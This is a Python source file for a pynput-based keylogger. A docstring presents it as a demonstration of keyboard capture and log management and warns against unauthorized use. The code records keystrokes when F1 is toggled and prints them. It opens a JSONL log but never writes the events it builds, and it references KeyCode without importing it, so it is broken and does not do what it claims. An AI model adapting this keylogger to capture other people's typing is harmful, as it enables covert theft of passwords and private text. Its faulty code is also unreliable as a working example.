"""
Abdul Jalal Raoufi
This keylogger demonstrates:
keyboard event capture, log management

Unauthorized use of keyloggers is illegal.
Only use on systems you own or have permission to monitor
"""

from dataclasses import dataclass
from datetime import datetime, timezone
from enum import Enum, auto

from pynput import keyboard
from pynput.keyboard import Key

class KeyType(Enum):
    CHAR = auto()
    SPECIAL = auto()
    UNKNOWN = auto()


@dataclass
class KeyEvent:

    timestamp: datetime
    key: str
    window_title: str | None = None
    key_type: KeyType = KeyType.CHAR

    def to_dict(self) -> dict[str, str]:

        return {
            "timestamp": self.timestamp.isoformat(),
            "key": self.key,
            "window_title": self.window_title or "Unknown",
            "key_type": self.key_type.name.lower(),
        }

    def to_log_string(self) -> str:
       
        time_str = self.timestamp.strftime("%Y-%m-%d %H:%M:%S")
        window_info = f" [{self.window_title}]" if self.window_title else ""
        return f"[{time_str}]{window_info} {self.key}"

def now_utc() -> datetime:

    return datetime.now(timezone.utc)

class keylogger:
    def __init__(self):
        self.recording=False
        self.toggle_key=Key.f1
        self.keyFile="keyfile.jsonl"

    
    def _process_key(self, key: Key | KeyCode) -> tuple[str, KeyType]:
        """
        Convert key to string representation and type
        """
        special_keys = {
            Key.space: "[SPACE]",
            Key.enter: "[ENTER]",
            Key.tab: "[TAB]",
            Key.backspace: "[BACKSPACE]",
            Key.delete: "[DELETE]",
            Key.shift: "[SHIFT]",
            Key.shift_r: "[SHIFT]",
            Key.ctrl: "[CTRL]",
            Key.ctrl_r: "[CTRL]",
            Key.alt: "[ALT]",
            Key.alt_r: "[ALT]",
            Key.cmd: "[CMD]",
            Key.cmd_r: "[CMD]",
            Key.esc: "[ESC]",
            Key.up: "[UP]",
            Key.down: "[DOWN]",
            Key.left: "[LEFT]",
            Key.right: "[RIGHT]",
        }

        if isinstance(key, Key):
            if key in special_keys:
                return special_keys[key], KeyType.SPECIAL
            return f"[{key.name.upper()}]", KeyType.SPECIAL

        if hasattr(key, 'char') and key.char:
            return key.char, KeyType.CHAR

        return "[UNKNOWN]", KeyType.UNKNOWN

    def toggle(self) -> bool:
            self.recording= not self.recording
            return self.recording
    

    def build_event(self, key: str, key_type: KeyType) -> KeyEvent:
        
        return KeyEvent(
            timestamp=now_utc(),
            key=key,
            key_type=key_type,
        )

    def keyPressed(self, key):
    
        if key == self.toggle_key:
            state=self.toggle()
            print(f"keyboard recording {'ON' if state else 'OFF'}")
            return
        
        if not self.recording:
            return


        print(str(key))
        with open(self.keyFile, 'a') as logKey:
            label, key_type = self._process_key(key)
            event = self.build_event(label, key_type)

if __name__ == "__main__":
        logger= keylogger()
        listener = keyboard.Listener(on_press=logger.keyPressed)
        listener.start()
        input()